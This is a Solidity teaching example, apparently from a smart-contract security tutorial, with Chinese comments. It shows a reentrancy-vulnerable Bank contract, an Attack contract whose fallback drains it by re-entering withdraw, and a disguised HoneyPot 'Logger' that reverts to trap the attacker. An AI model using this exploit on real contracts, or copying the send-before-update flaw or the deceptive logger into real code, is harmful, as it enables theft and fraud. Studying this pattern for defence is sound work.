// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
1. 部署 HoneyPot 合约。
2. 部署 Bank 合约，传入 HoneyPot 的地址作为 Logger。
3. Alice 存入 1 个以太币到 Bank。
4. Eve 发现 Bank 的重入漏洞，部署 Attack 合约，传入 Bank 的地址。
5. Eve 调用 Attack.attack，试图利用重入漏洞提取多次以太币。
6. 在 Bank.withdraw 最后一次调用 logger.log 时，HoneyPot.log 检测到 "Withdraw" 动作，触发回退，导致交易失败。
*/

contract Bank {
    mapping(address => uint256) public balances;
    Logger logger;

    constructor(Logger _logger) {
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint256 _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");

        (bool sent,) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;

        logger.log(msg.sender, _amount, "Withdraw");
    }
}

contract Logger {
    event Log(address caller, uint256 amount, string action);

    function log(address _caller, uint256 _amount, string memory _action)
        public
    {
        emit Log(_caller, _amount, _action);
    }
}

// Hacker tries to drain the Ethers stored in Bank by reentrancy.
contract Attack {
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// Let's say this code is in a separate file so that others cannot read it.
contract HoneyPot {
    function log(address _caller, uint256 _amount, string memory _action)
        public
    {
        if (equal(_action, "Withdraw")) {
            revert("It's a trap");
        }
    }

    // Function to compare strings using keccak256
    function equal(string memory _a, string memory _b)
        public
        pure
        returns (bool)
    {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}
